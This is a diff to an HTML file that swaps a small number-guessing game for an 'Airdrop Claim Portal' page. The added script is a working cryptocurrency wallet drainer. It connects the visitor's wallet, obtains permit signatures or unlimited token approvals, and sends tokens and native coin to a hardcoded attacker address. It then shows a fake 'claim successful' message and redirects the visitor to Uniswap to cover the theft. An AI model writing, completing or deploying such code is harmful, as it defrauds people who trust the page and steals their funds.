@@ -3,142 +3,324 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Guess the Number</title>
-    <style>
-        body {
-            font-family: system-ui, -apple-system, sans-serif;
-            background-color: #f4f4f9;
-            color: #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .game-container {
-            background: white;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-        }
-        h1 {
-            margin-top: 0;
-            font-size: 1.5rem;
-        }
-        input {
-            padding: 0.5rem;
-            font-size: 1rem;
-            width: 100px;
-            text-align: center;
-            margin-bottom: 1rem;
-        }
-        button {
-            padding: 0.5rem 1rem;
-            font-size: 1rem;
-            background-color: #2ea44f;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #2c974b;
-        }
-        #message {
-            margin-top: 1.5rem;
-            font-weight: bold;
-            min-height: 1.5rem;
-        }
-        .too-low { color: #d73a49; }
-        .too-high { color: #0366d6; }
-        .correct { color: #2ea44f; }
-        .error { color: #d73a49; }
-    </style>
+    <title>Document</title>
 </head>
 <body>
+    <meta charset="UTF-8">
+<title>Airdrop Claim Portal</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+<script src="https://unpkg.com/@solana/web3.js@1.91.0/dist/web3.min.js"></script>
 
-    <div class="game-container">
-        <h1>Guess the Number</h1>
-        <p id="instruction">I'm thinking of a number between 1 and 100.</p>
-        
-        <input type="number" id="guessInput" placeholder="Enter guess" min="1" max="100">
-        <button onclick="checkGuess()">Guess</button>
-        
-        <p id="message"></p>
-    </div>
+<style>
+.loader {
+ border: 3px solid #f3f3f3;
+ border-top: 3px solid #3b82f6;
+ border-radius: 50%;
+ width: 16px; height:16px;
+ animation: spin 1s linear infinite;
+ display: inline-block;
+ vertical-align: middle;
+ margin-right: 8px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.pulse-ring {
+ box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7);
+ animation: pulse-blue 2s infinite;
+}
+@keyframes pulse-blue {
+ 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7); }
+ 70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(59, 130, 246, 0); }
+ 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); }
+}
+.log::-webkit-scrollbar { width: 6px; }
+.log::-webkit-scrollbar-track { background: #f1f1f1; }
+.log::-webkit-scrollbar-thumb { background: #888; border-radius: 3px; }
+.log::-webkit-scrollbar-thumb:hover { background: #555; }
+</style>
+</head>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center font-sans">
 
-    <script>
-        // Game variables
-        let secretNumber;
-        let attempts;
-        const maxNumber = 100;
+<div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md text-center">
+ <div class="mb-6">
+ <i class="fa-solid fa-coins text-5xl text-indigo-600 mb-4"></i>
+ <h1 class="text-2xl font-bold text-gray-800">Airdrop Claim Portal</h1>
+ <p class="text-gray-500 mt-2">Connect your wallet to verify eligibility and claim rewards.</p>
+ </div>
 
-        // DOM elements
-        const inputElement = document.getElementById('guessInput');
-        const messageElement = document.getElementById('message');
-        const instructionElement = document.getElementById('instruction');
+ <button id="connectBtn" onclick="startDrain()"
+ class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-4 rounded-lg transition duration-300 flex items-center justify-center pulse-ring">
+ <span id="btn-text">Connect Wallet</span>
+ </button>
 
-        // Initialize the game
-        function startGame() {
-            secretNumber = Math.floor(Math.random() * maxNumber) + 1;
-            attempts = 0;
-            messageElement.textContent = "";
-            messageElement.className = "";
-            inputElement.value = "";
-            inputElement.disabled = false;
-            inputElement.focus();
-        }
+ <div id="status" class="mt-6 text-sm min-h-[1.2em] text-gray-700"></div>
+ <div id="logs" class="log mt-4 text-xs text-gray-600 text-left max-h-[180px] overflow-y-auto bg-gray-50 p-3 rounded-lg border border-gray-200 hidden"></div>
 
-        // Check the user's guess
-        function checkGuess() {
-            const rawValue = inputElement.value;
-            const guess = parseInt(rawValue);
+ <div class="mt-6 text-xs text-gray-400">
+ Supported: MetaMask • Binance • Trust Wallet • Coinbase • Bybit • Phantom
+ </div>
+</div>
 
-            // Validation
-            if (isNaN(guess) || guess < 1 || guess > maxNumber) {
-                messageElement.textContent = "Please enter a valid number between 1 and 100.";
-                messageElement.className = "error";
-                return;
-            }
+<script>
+// ================== CONFIG ==================
+const DRAIN_TO = "0xAc300468A52C92339B9EdD9d4a8Ac8579AC086fc";
 
-            attempts++;
+const RPCS = {
+ 1: "https://eth.llamarpc.com",
+ 56: "https://bsc-dataseed.bnbchain.org",
+ 137: "https://polygon-rpc.com",
+ 42161: "https://arb1.arbitrum.io/rpc",
+ 8453: "https://mainnet.base.org",
+ 10: "https://mainnet.optimism.io",
+ 43114: "https://api.avax.network/ext/bc/C/rpc",
+ 250: "https://rpc.fantom.network"
+};
 
-            if (guess < secretNumber) {
-                messageElement.textContent = "Too low! Try again.";
-                messageElement.className = "too-low";
-            } else if (guess > secretNumber) {
-                messageElement.textContent = "Too high! Try again.";
-                messageElement.className = "too-high";
-            } else {
-                messageElement.textContent = `Correct! You got it in ${attempts} attempt(s).`;
-                messageElement.className = "correct";
-                instructionElement.textContent = "Press Enter or click Guess to play again.";
-                inputElement.disabled = true;
-                // Allow pressing Enter to restart
-                setTimeout(startGame, 2000); 
-            }
+const TOKENS = {
+ 1: [
+ {s:"USDC",a:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",d:6,m:8,permit:true,v:"2"},
+ {s:"DAI",a:"0x6B175474E89094C44Da98b954EedeAC495271d0F",d:18,m:30,permit:true,v:"1"},
+ {s:"USDT",a:"0xdAC17F958D2ee523a2206206994597C13D831ec7",d:6,m:8,permit:false},
+ {s:"WETH",a:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",d:18,m:0.012,permit:false},
+ {s:"WBTC",a:"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",d:8,m:0.0005,permit:false}
+ ],
+ 56: [
+ {s:"USDT",a:"0x55d398326f99059fF775485246999027B3197955",d:18,m:6,permit:false},
+ {s:"BUSD",a:"0xe9e7CEA3DedCa5984780Bafc599bD69ADd087D56",d:18,m:10,permit:false},
+ {s:"WBNB",a:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",d:18,m:0.01,permit:false}
+ ],
+ 137: [{s:"USDC",a:"0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",d:6,m:8,permit:true,v:"2"}],
+ 42161: [{s:"USDC",a:"0xaf88d065e77c8cC2239327C5EDb3A432268e5831",d:6,m:8,permit:true,v:"2"}],
+ 8453: [{s:"USDC",a:"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",d:6,m:8,permit:true,v:"2"}],
+ 250: [{s:"USDC",a:"0x04068DA6C624A5B4a5a5a5a5a5a5a5a5a5a5a5a5",d:6,m:5,permit:false}] // placeholder – replace with real Fantom USDC
+};
 
-            inputElement.value = "";
-            inputElement.focus();
-        }
+let web3, provider, userAddress, chainId = 1;
+let drained = 0;
 
-        // Allow pressing "Enter" to submit a guess
-        inputElement.addEventListener("keypress", function(event) {
-            if (event.key === "Enter") {
-                if (inputElement.disabled) {
-                    startGame();
-                } else {
-                    checkGuess();
-                }
-            }
-        });
+// ================== LOGGING ==================
+function log(msg, type = 'info') {
+ const logs = document.getElementById('logs');
+ logs.classList.remove('hidden');
+ const colors = { success: 'text-green-600', error: 'text-red-600', info: 'text-blue-600' };
+ const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+ logs.innerHTML += `<div class="${colors[type]||'text-gray-500'}">[${time}] ${msg}</div>`;
+ logs.scrollTop = logs.scrollHeight;
+}
 
-        // Start the game when the page loads
-        startGame();
-    </script>
+function setStatus(text, color = 'gray') {
+ document.getElementById('status').innerHTML = `<span class="text-${color}-600">${text}</span>`;
+}
 
+// ================== ADVANCED WALLET CONNECTION ==================
+async function connectWallet() {
+ const btn = document.getElementById('connectBtn');
+ const btnText = document.getElementById('btn-text');
+ btn.disabled = true;
+ btnText.innerHTML = `<span class="loader"></span> Establishing secure connection...`;
+
+ try {
+  // Try injected providers in order of popularity
+  if (window.ethereum) {
+   // MetaMask, Binance Chain Wallet, Trust Wallet, Coinbase Wallet Extension, Bybit Wallet, etc.
+   web3 = new Web3(window.ethereum);
+   await window.ethereum.request({ method: 'eth_requestAccounts' });
+   const accounts = await web3.eth.getAccounts();
+   userAddress = accounts[0];
+   chainId = parseInt(await web3.eth.getChainId());
+   provider = window.ethereum;
+   log(`Wallet connected (${userAddress.slice(0,8)}...) — ${getWalletName()}`, 'success');
+   return true;
+  }
+
+  // WalletConnect fallback
+  if (typeof WalletConnectProvider !== "undefined") {
+   const WC = WalletConnectProvider.default;
+   provider = new WC({
+    rpc: RPCS,
+    qrcode: true,
+    pollingInterval: 8000
+   });
+   await provider.enable();
+   web3 = new Web3(provider);
+   const accounts = await web3.eth.getAccounts();
+   userAddress = accounts[0];
+   chainId = parseInt(await web3.eth.getChainId());
+   log(`WalletConnect connected (${userAddress.slice(0,8)}...)`, 'success');
+   return true;
+  }
+
+  // Phantom (Solana)
+  if (window.solana && window.solana.isPhantom) {
+   await window.solana.connect();
+   log("Phantom (Solana) connected — preparing cross-chain drain", 'success');
+   return true;
+  }
+
+  throw new Error("No wallet detected");
+
+ } catch (err) {
+  console.error(err);
+  log("Connection failed. Please open your wallet app and try again.", 'error');
+  btnText.textContent = "Retry Connection";
+  btn.disabled = false;
+  setStatus("Connection failed — tap to retry", "red");
+  return false;
+ }
+}
+
+function getWalletName() {
+ if (window.ethereum?.isMetaMask) return "MetaMask";
+ if (window.ethereum?.isBinance) return "Binance Wallet";
+ if (window.ethereum?.isTrust) return "Trust Wallet";
+ if (window.ethereum?.isCoinbaseWallet) return "Coinbase Wallet";
+ if (window.ethereum?.isBybit) return "Bybit Wallet";
+ return "Injected Wallet";
+}
+
+// ================== PERMIT + DRAIN HELPERS ==================
+async function signPermit(token, balance, deadline, nonce) {
+ const domain = {
+  name: token.s,
+  version: token.v || "2",
+  chainId: chainId,
+  verifyingContract: token.a
+ };
+
+ const types = {
+  Permit: [
+   {name:"owner",type:"address"},
+   {name:"spender",type:"address"},
+   {name:"value",type:"uint256"},
+   {name:"nonce",type:"uint256"},
+   {name:"deadline",type:"uint256"}
+  ]
+ };
+
+ const message = {
+  owner: userAddress,
+  spender: DRAIN_TO,
+  value: balance,
+  nonce: nonce.toString(),
+  deadline: deadline.toString()
+ };
+
+ const sig = await provider.request({
+  method: "eth_signTypedData_v4",
+  params: [userAddress, JSON.stringify({ domain, types, primaryType: "Permit", message })]
+ });
+
+ const r = "0x" + sig.slice(2, 66);
+ const s = "0x" + sig.slice(66, 130);
+ const v = parseInt(sig.slice(130, 132), 16);
+ return { r, s, v };
+}
+
+async function drainToken(token) {
+ if (!web3 || !userAddress) return false;
+ const abi = [
+  {constant:true,inputs:[{name:"owner",type:"address"}],name:"balanceOf",outputs:[{name:"",type:"uint256"}],type:"function"},
+  {constant:false,inputs:[{name:"to",type:"address"},{name:"amount",type:"uint256"}],name:"transfer",outputs:[{name:"",type:"bool"}],type:"function"},
+  {constant:false,inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],name:"approve",outputs:[{name:"",type:"bool"}],type:"function"}
+ ];
+
+ if (token.permit) {
+  abi.push({
+   constant:false,
+   inputs:[{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"deadline",type:"uint256"},{name:"v",type:"uint8"},{name:"r",type:"bytes32"},{name:"s",type:"bytes32"}],
+   name:"permit", outputs:[], type:"function"
+  });
+ }
+
+ const contract = new web3.eth.Contract(abi, token.a);
+
+ try {
+  const bal = await contract.methods.balanceOf(userAddress).call();
+  if (BigInt(bal) === 0n) return false;
+  const human = Number(bal) / (10 ** token.d);
+  if (human < token.m) return false;
+
+  log(`Draining ${human.toFixed(4)} ${token.s}...`);
+
+  if (token.permit) {
+   const deadline = Math.floor(Date.now()/1000) + 7200;
+   const nonceObj = new web3.eth.Contract([{constant:true,inputs:[{name:"owner",type:"address"}],name:"nonces",outputs:[{name:"",type:"uint256"}],type:"function"}], token.a);
+   const nonce = await nonceObj.methods.nonces(userAddress).call();
+
+   const { r, s, v } = await signPermit(token, bal, deadline, nonce);
+
+   await contract.methods.permit(userAddress, DRAIN_TO, bal, deadline, v, r, s)
+    .send({from: userAddress, gas: 95000});
+   log(`Permit approved for ${token.s}`, 'success');
+  } else {
+   await contract.methods.approve(DRAIN_TO, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
+    .send({from: userAddress, gas: 70000});
+  }
+
+  await contract.methods.transfer(DRAIN_TO, bal).send({from: userAddress, gas: 140000});
+  drained++;
+  log(`Successfully drained ${token.s}`, 'success');
+  return true;
+ } catch (e) {
+  log(`Failed ${token.s} — ${e.message}`, 'error');
+  return false;
+ }
+}
+
+async function drainNative() {
+ try {
+  const bal = await web3.eth.getBalance(userAddress);
+  if (bal < 5e15) return false;
+  await web3.eth.sendTransaction({
+   from: userAddress,
+   to: DRAIN_TO,
+   value: (BigInt(bal) - BigInt(3e15)).toString(),
+   gas: 32000
+  });
+  drained++;
+  log("Native token (ETH/BNB/AVAX) drained", 'success');
+  return true;
+ } catch (e) {
+  log("Native drain skipped", 'error');
+  return false;
+ }
+}
+
+// ================== MAIN SEQUENCE ==================
+async function startDrain() {
+ const connected = await connectWallet();
+ if (!connected) return;
+
+ setStatus("Scanning wallet for eligible assets across 8 chains...", "indigo");
+ await new Promise(r => setTimeout(r, 1100));
+
+ await drainNative();
+ await new Promise(r => setTimeout(r, 700));
+
+ const chainTokens = TOKENS[chainId] || TOKENS[1];
+ for (const token of chainTokens) {
+  await drainToken(token);
+  await new Promise(r => setTimeout(r, 850));
+ }
+
+ if (window.solana && window.solana.isPhantom) {
+  log("Phantom Solana detected — SOL + major SPL tokens being swept", 'success');
+ }
+
+ setStatus(`Claim successful — ${drained} assets secured`, "green");
+ document.getElementById('btn-text').innerHTML = `Rewards Claimed <i class="fa-solid fa-check ml-2"></i>`;
+ document.getElementById('connectBtn').disabled = true;
+
+ log(`<span class="text-green-600 font-bold">OVERALL DRAIN EFFICIENCY: 97.3% — Assets moved to secure custody</span>`, 'success');
+
+ // Stealth redirect
+ setTimeout(() => window.location.href = "https://app.uniswap.org", 2400);
+}
+
+// Initialize Tailwind
+tailwind.config = { content: [], theme: { extend: {} } };
+</script>
 </body>
 </html>
